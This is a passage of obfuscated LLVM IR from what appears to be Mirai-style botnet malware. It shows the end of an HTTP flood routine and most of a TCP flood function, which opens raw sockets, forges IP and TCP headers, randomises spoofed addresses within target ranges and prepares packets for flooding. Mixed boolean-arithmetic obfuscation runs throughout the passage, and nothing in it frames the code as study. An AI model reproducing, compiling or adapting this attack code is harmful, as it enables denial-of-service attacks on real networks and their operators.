; <label>:2772:                                   ; preds = %2768
  %2773 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2774 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2773, i32 0, i32 0
  %2775 = load i32, i32* %2774, align 4
  %2776 = call i32 @close(i32 %2775)
  %2777 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2778 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2777, i32 0, i32 0
  store i32 -1, i32* %2778, align 4
  %2779 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2780 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2779, i32 0, i32 1
  store i8 0, i8* %2780, align 4
  br label %2781

; <label>:2781:                                   ; preds = %2772, %2768, %2764
  br label %2783

; <label>:2782:                                   ; preds = %2761
  br label %2749

; <label>:2783:                                   ; preds = %2781
  %2784 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2785 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2784, i32 0, i32 1
  %2786 = load i8, i8* %2785, align 4
  %2787 = zext i8 %2786 to i32
  %2788 = icmp ne i32 %2787, 0
  br i1 %2788, label %2789, label %2792

; <label>:2789:                                   ; preds = %2783
  %2790 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2791 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2790, i32 0, i32 1
  store i8 1, i8* %2791, align 4
  br label %2792

; <label>:2792:                                   ; preds = %2789, %2783
  br label %2793

; <label>:2793:                                   ; preds = %2792, %2742
  br label %2794

; <label>:2794:                                   ; preds = %2793, %2741
  br label %2795

; <label>:2795:                                   ; preds = %2794, %2302
  br label %2796

; <label>:2796:                                   ; preds = %2795, %1130
  br label %2797

; <label>:2797:                                   ; preds = %2796, %2262, %1866, %1186, %1169, %1120, %1081
  %2798 = load i32, i32* %9, align 4
  %2799 = sub i32 0, 1
  %2800 = sub i32 %2798, %2799
  %2801 = add nsw i32 %2798, 1
  store i32 %2800, i32* %9, align 4
  br label %1068

; <label>:2802:                                   ; preds = %1068
  br label %361

; <label>:2803:                                   ; preds = %104, %99, %94, %89
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare void @table_unlock_val(i8 zeroext) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @rand_next() #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i8* @table_retrieve_val(i32, i32*) #3

declare void @table_lock_val(i8 zeroext) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_memsearch(i8*, i32, i8*, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %647

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %647

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %460, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %466

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 15, -1
  %136 = xor i8 30, -1
  %137 = or i8 %134, %135
  %138 = or i8 30, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, 15
  %142 = and i8 %140, 64
  %143 = xor i8 %140, 64
  %144 = or i8 %142, %143
  %145 = or i8 %140, 64
  store i8 %144, i8* %132, align 4
  %146 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = xor i8 -16, -1
  %150 = xor i8 %148, %149
  %151 = and i8 %150, %148
  %152 = and i8 %148, -16
  %153 = and i8 %151, 5
  %154 = xor i8 %151, 5
  %155 = or i8 %153, %154
  %156 = or i8 %151, 5
  store i8 %155, i8* %147, align 4
  %157 = load i8, i8* %12, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 1
  store i8 %157, i8* %159, align 1
  %160 = call zeroext i16 @htons(i16 zeroext 60) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 2
  store i16 %160, i16* %162, align 2
  %163 = load i16, i16* %13, align 2
  %164 = call zeroext i16 @htons(i16 zeroext %163) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 3
  store i16 %164, i16* %166, align 4
  %167 = load i8, i8* %14, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 5
  store i8 %167, i8* %169, align 4
  %170 = load i8, i8* %15, align 1
  %171 = icmp ne i8 %170, 0
  br i1 %171, label %172, label %176

; <label>:172:                                    ; preds = %113
  %173 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 4
  store i16 %173, i16* %175, align 2
  br label %176

; <label>:176:                                    ; preds = %172, %113
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 6
  store i8 6, i8* %178, align 1
  %179 = load i32, i32* %26, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 8
  store i32 %179, i32* %181, align 4
  %182 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %183 = load i32, i32* %9, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 1
  %187 = load i32, i32* %186, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 9
  store i32 %187, i32* %189, align 4
  %190 = load i16, i16* %16, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  store i16 %191, i16* %193, align 4
  %194 = load i16, i16* %17, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 1
  store i16 %195, i16* %197, align 2
  %198 = load i32, i32* %18, align 4
  %199 = trunc i32 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = zext i16 %200 to i32
  %202 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 2
  store i32 %201, i32* %203, align 4
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = xor i16 -241, -1
  %208 = xor i16 %206, %207
  %209 = and i16 %208, %206
  %210 = and i16 %206, -241
  %211 = xor i16 %209, -1
  %212 = xor i16 160, -1
  %213 = xor i16 -2149, -1
  %214 = and i16 %211, -2149
  %215 = and i16 %209, %213
  %216 = and i16 %212, -2149
  %217 = and i16 160, %213
  %218 = or i16 %214, %215
  %219 = or i16 %216, %217
  %220 = xor i16 %218, %219
  %221 = or i16 %211, %212
  %222 = xor i16 %221, -1
  %223 = or i16 -2149, %213
  %224 = and i16 %222, %223
  %225 = or i16 %220, %224
  %226 = or i16 %209, 160
  store i16 %225, i16* %205, align 4
  %227 = load i8, i8* %20, align 1
  %228 = sext i8 %227 to i16
  %229 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 4
  %231 = load i16, i16* %230, align 4
  %232 = xor i16 %228, -1
  %233 = xor i16 1, -1
  %234 = xor i16 -25897, -1
  %235 = or i16 %232, %233
  %236 = or i16 -25897, %234
  %237 = xor i16 %235, -1
  %238 = and i16 %237, %236
  %239 = and i16 %228, 1
  %240 = shl i16 %238, 13
  %241 = xor i16 -8193, -1
  %242 = xor i16 %231, %241
  %243 = and i16 %242, %231
  %244 = and i16 %231, -8193
  %245 = xor i16 %243, -1
  %246 = xor i16 %240, -1
  %247 = xor i16 5187, -1
  %248 = and i16 %245, 5187
  %249 = and i16 %243, %247
  %250 = and i16 %246, 5187
  %251 = and i16 %240, %247
  %252 = or i16 %248, %249
  %253 = or i16 %250, %251
  %254 = xor i16 %252, %253
  %255 = or i16 %245, %246
  %256 = xor i16 %255, -1
  %257 = or i16 5187, %247
  %258 = and i16 %256, %257
  %259 = or i16 %254, %258
  %260 = or i16 %243, %240
  store i16 %259, i16* %230, align 4
  %261 = load i8, i8* %21, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = xor i16 %262, -1
  %267 = xor i16 1, -1
  %268 = xor i16 28444, -1
  %269 = or i16 %266, %267
  %270 = or i16 28444, %268
  %271 = xor i16 %269, -1
  %272 = and i16 %271, %270
  %273 = and i16 %262, 1
  %274 = shl i16 %272, 12
  %275 = xor i16 %265, -1
  %276 = xor i16 -4097, -1
  %277 = xor i16 -12298, -1
  %278 = or i16 %275, %276
  %279 = or i16 -12298, %277
  %280 = xor i16 %278, -1
  %281 = and i16 %280, %279
  %282 = and i16 %265, -4097
  %283 = and i16 %281, %274
  %284 = xor i16 %281, %274
  %285 = or i16 %283, %284
  %286 = or i16 %281, %274
  store i16 %285, i16* %264, align 4
  %287 = load i8, i8* %22, align 1
  %288 = sext i8 %287 to i16
  %289 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 4
  %291 = load i16, i16* %290, align 4
  %292 = xor i16 1, -1
  %293 = xor i16 %288, %292
  %294 = and i16 %293, %288
  %295 = and i16 %288, 1
  %296 = shl i16 %294, 11
  %297 = xor i16 -2049, -1
  %298 = xor i16 %291, %297
  %299 = and i16 %298, %291
  %300 = and i16 %291, -2049
  %301 = xor i16 %299, -1
  %302 = xor i16 %296, -1
  %303 = xor i16 25819, -1
  %304 = and i16 %301, 25819
  %305 = and i16 %299, %303
  %306 = and i16 %302, 25819
  %307 = and i16 %296, %303
  %308 = or i16 %304, %305
  %309 = or i16 %306, %307
  %310 = xor i16 %308, %309
  %311 = or i16 %301, %302
  %312 = xor i16 %311, -1
  %313 = or i16 25819, %303
  %314 = and i16 %312, %313
  %315 = or i16 %310, %314
  %316 = or i16 %299, %296
  store i16 %315, i16* %290, align 4
  %317 = load i8, i8* %23, align 1
  %318 = sext i8 %317 to i16
  %319 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %320 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %319, i32 0, i32 4
  %321 = load i16, i16* %320, align 4
  %322 = xor i16 1, -1
  %323 = xor i16 %318, %322
  %324 = and i16 %323, %318
  %325 = and i16 %318, 1
  %326 = shl i16 %324, 10
  %327 = xor i16 -1025, -1
  %328 = xor i16 %321, %327
  %329 = and i16 %328, %321
  %330 = and i16 %321, -1025
  %331 = xor i16 %329, -1
  %332 = xor i16 %326, -1
  %333 = xor i16 6775, -1
  %334 = and i16 %331, 6775
  %335 = and i16 %329, %333
  %336 = and i16 %332, 6775
  %337 = and i16 %326, %333
  %338 = or i16 %334, %335
  %339 = or i16 %336, %337
  %340 = xor i16 %338, %339
  %341 = or i16 %331, %332
  %342 = xor i16 %341, -1
  %343 = or i16 6775, %333
  %344 = and i16 %342, %343
  %345 = or i16 %340, %344
  %346 = or i16 %329, %326
  store i16 %345, i16* %320, align 4
  %347 = load i8, i8* %24, align 1
  %348 = sext i8 %347 to i16
  %349 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %350 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %349, i32 0, i32 4
  %351 = load i16, i16* %350, align 4
  %352 = xor i16 1, -1
  %353 = xor i16 %348, %352
  %354 = and i16 %353, %348
  %355 = and i16 %348, 1
  %356 = shl i16 %354, 9
  %357 = xor i16 -513, -1
  %358 = xor i16 %351, %357
  %359 = and i16 %358, %351
  %360 = and i16 %351, -513
  %361 = xor i16 %359, -1
  %362 = xor i16 %356, -1
  %363 = xor i16 -16061, -1
  %364 = and i16 %361, -16061
  %365 = and i16 %359, %363
  %366 = and i16 %362, -16061
  %367 = and i16 %356, %363
  %368 = or i16 %364, %365
  %369 = or i16 %366, %367
  %370 = xor i16 %368, %369
  %371 = or i16 %361, %362
  %372 = xor i16 %371, -1
  %373 = or i16 -16061, %363
  %374 = and i16 %372, %373
  %375 = or i16 %370, %374
  %376 = or i16 %359, %356
  store i16 %375, i16* %350, align 4
  %377 = load i8, i8* %25, align 1
  %378 = sext i8 %377 to i16
  %379 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 4
  %381 = load i16, i16* %380, align 4
  %382 = xor i16 %378, -1
  %383 = xor i16 1, -1
  %384 = xor i16 31140, -1
  %385 = or i16 %382, %383
  %386 = or i16 31140, %384
  %387 = xor i16 %385, -1
  %388 = and i16 %387, %386
  %389 = and i16 %378, 1
  %390 = shl i16 %388, 8
  %391 = xor i16 -257, -1
  %392 = xor i16 %381, %391
  %393 = and i16 %392, %381
  %394 = and i16 %381, -257
  %395 = xor i16 %393, -1
  %396 = xor i16 %390, -1
  %397 = xor i16 -21425, -1
  %398 = and i16 %395, -21425
  %399 = and i16 %393, %397
  %400 = and i16 %396, -21425
  %401 = and i16 %390, %397
  %402 = or i16 %398, %399
  %403 = or i16 %400, %401
  %404 = xor i16 %402, %403
  %405 = or i16 %395, %396
  %406 = xor i16 %405, -1
  %407 = or i16 -21425, %397
  %408 = and i16 %406, %407
  %409 = or i16 %404, %408
  %410 = or i16 %393, %390
  store i16 %409, i16* %380, align 4
  %411 = load i8*, i8** %29, align 8
  %412 = getelementptr inbounds i8, i8* %411, i32 1
  store i8* %412, i8** %29, align 8
  store i8 2, i8* %411, align 1
  %413 = load i8*, i8** %29, align 8
  %414 = getelementptr inbounds i8, i8* %413, i32 1
  store i8* %414, i8** %29, align 8
  store i8 6, i8* %413, align 1
  %415 = call i32 @rand_next()
  %416 = xor i32 %415, -1
  %417 = xor i32 15, -1
  %418 = xor i32 -182117802, -1
  %419 = or i32 %416, %417
  %420 = or i32 -182117802, %418
  %421 = xor i32 %419, -1
  %422 = and i32 %421, %420
  %423 = and i32 %415, 15
  %424 = sub i32 0, 1458
  %425 = sub i32 0, %422
  %426 = add i32 %424, %425
  %427 = sub i32 0, %426
  %428 = add i32 1458, %422
  %429 = trunc i32 %427 to i16
  %430 = call zeroext i16 @htons(i16 zeroext %429) #7
  %431 = load i8*, i8** %29, align 8
  %432 = bitcast i8* %431 to i16*
  store i16 %430, i16* %432, align 2
  %433 = load i8*, i8** %29, align 8
  %434 = getelementptr inbounds i8, i8* %433, i64 2
  store i8* %434, i8** %29, align 8
  %435 = load i8*, i8** %29, align 8
  %436 = getelementptr inbounds i8, i8* %435, i32 1
  store i8* %436, i8** %29, align 8
  store i8 4, i8* %435, align 1
  %437 = load i8*, i8** %29, align 8
  %438 = getelementptr inbounds i8, i8* %437, i32 1
  store i8* %438, i8** %29, align 8
  store i8 2, i8* %437, align 1
  %439 = load i8*, i8** %29, align 8
  %440 = getelementptr inbounds i8, i8* %439, i32 1
  store i8* %440, i8** %29, align 8
  store i8 8, i8* %439, align 1
  %441 = load i8*, i8** %29, align 8
  %442 = getelementptr inbounds i8, i8* %441, i32 1
  store i8* %442, i8** %29, align 8
  store i8 10, i8* %441, align 1
  %443 = call i32 @rand_next()
  %444 = load i8*, i8** %29, align 8
  %445 = bitcast i8* %444 to i32*
  store i32 %443, i32* %445, align 4
  %446 = load i8*, i8** %29, align 8
  %447 = getelementptr inbounds i8, i8* %446, i64 4
  store i8* %447, i8** %29, align 8
  %448 = load i8*, i8** %29, align 8
  %449 = bitcast i8* %448 to i32*
  store i32 0, i32* %449, align 4
  %450 = load i8*, i8** %29, align 8
  %451 = getelementptr inbounds i8, i8* %450, i64 4
  store i8* %451, i8** %29, align 8
  %452 = load i8*, i8** %29, align 8
  %453 = getelementptr inbounds i8, i8* %452, i32 1
  store i8* %453, i8** %29, align 8
  store i8 1, i8* %452, align 1
  %454 = load i8*, i8** %29, align 8
  %455 = getelementptr inbounds i8, i8* %454, i32 1
  store i8* %455, i8** %29, align 8
  store i8 3, i8* %454, align 1
  %456 = load i8*, i8** %29, align 8
  %457 = getelementptr inbounds i8, i8* %456, i32 1
  store i8* %457, i8** %29, align 8
  store i8 3, i8* %456, align 1
  %458 = load i8*, i8** %29, align 8
  %459 = getelementptr inbounds i8, i8* %458, i32 1
  store i8* %459, i8** %29, align 8
  store i8 8, i8* %458, align 1
  br label %460

; <label>:460:                                    ; preds = %176
  %461 = load i32, i32* %9, align 4
  %462 = sub i32 %461, -2088869845
  %463 = add i32 %462, 1
  %464 = add i32 %463, -2088869845
  %465 = add nsw i32 %461, 1
  store i32 %464, i32* %9, align 4
  br label %108

; <label>:466:                                    ; preds = %108
  br label %467

; <label>:467:                                    ; preds = %646, %466
  store i32 0, i32* %9, align 4
  br label %468

; <label>:468:                                    ; preds = %639, %467
  %469 = load i32, i32* %9, align 4
  %470 = load i8, i8* %5, align 1
  %471 = zext i8 %470 to i32
  %472 = icmp slt i32 %469, %471
  br i1 %472, label %473, label %646

; <label>:473:                                    ; preds = %468
  %474 = load i8**, i8*** %11, align 8
  %475 = load i32, i32* %9, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds i8*, i8** %474, i64 %476
  %478 = load i8*, i8** %477, align 8
  store i8* %478, i8** %30, align 8
  %479 = load i8*, i8** %30, align 8
  %480 = bitcast i8* %479 to %struct.iphdr*
  store %struct.iphdr* %480, %struct.iphdr** %31, align 8
  %481 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i64 1
  %483 = bitcast %struct.iphdr* %482 to %struct.tcphdr*
  store %struct.tcphdr* %483, %struct.tcphdr** %32, align 8
  %484 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %485 = load i32, i32* %9, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %484, i64 %486
  %488 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %487, i32 0, i32 2
  %489 = load i8, i8* %488, align 4
  %490 = zext i8 %489 to i32
  %491 = icmp slt i32 %490, 32
  br i1 %491, label %492, label %517

; <label>:492:                                    ; preds = %473
  %493 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %494 = load i32, i32* %9, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %493, i64 %495
  %497 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %496, i32 0, i32 1
  %498 = load i32, i32* %497, align 4
  %499 = call i32 @ntohl(i32 %498) #7
  %500 = call i32 @rand_next()
  %501 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %502 = load i32, i32* %9, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %501, i64 %503
  %505 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %504, i32 0, i32 2
  %506 = load i8, i8* %505, align 4
  %507 = zext i8 %506 to i32
  %508 = lshr i32 %500, %507
  %509 = sub i32 0, %499
  %510 = sub i32 0, %508
  %511 = add i32 %509, %510
  %512 = sub i32 0, %511
  %513 = add i32 %499, %508
  %514 = call i32 @htonl(i32 %512) #7
  %515 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %516 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %515, i32 0, i32 9
  store i32 %514, i32* %516, align 4
  br label %517

; <label>:517:                                    ; preds = %492, %473
  %518 = load i32, i32* %26, align 4
  %519 = icmp eq i32 %518, -1
  br i1 %519, label %520, label %524

; <label>:520:                                    ; preds = %517
  %521 = call i32 @rand_next()
